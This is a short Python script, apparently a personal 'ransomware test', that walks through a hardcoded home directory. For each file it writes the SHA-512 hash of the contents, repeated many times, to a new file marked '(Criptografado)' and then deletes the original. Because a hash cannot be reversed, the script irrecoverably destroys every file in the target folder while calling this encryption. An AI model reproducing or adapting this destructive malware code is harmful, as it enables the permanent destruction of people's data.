# path =  deivid/'Área de Trabalho'/testeRansomware
import hashlib
import os

diretorio = "/home/deivid/Documentos/testeRansomware"

for files in os.listdir(diretorio):
    os.chdir(diretorio)
    with open(files, 'rb') as rb:
        dados = rb.read()

        criptografar = hashlib.sha512(dados).hexdigest()
        novo_arquivo = "(Criptografado)" + os.path.basename(files)

        with open(novo_arquivo, 'w') as novo:
            novo.write(criptografar*0x77)

            novo.close()
            rb.close()

            os.remove(files);
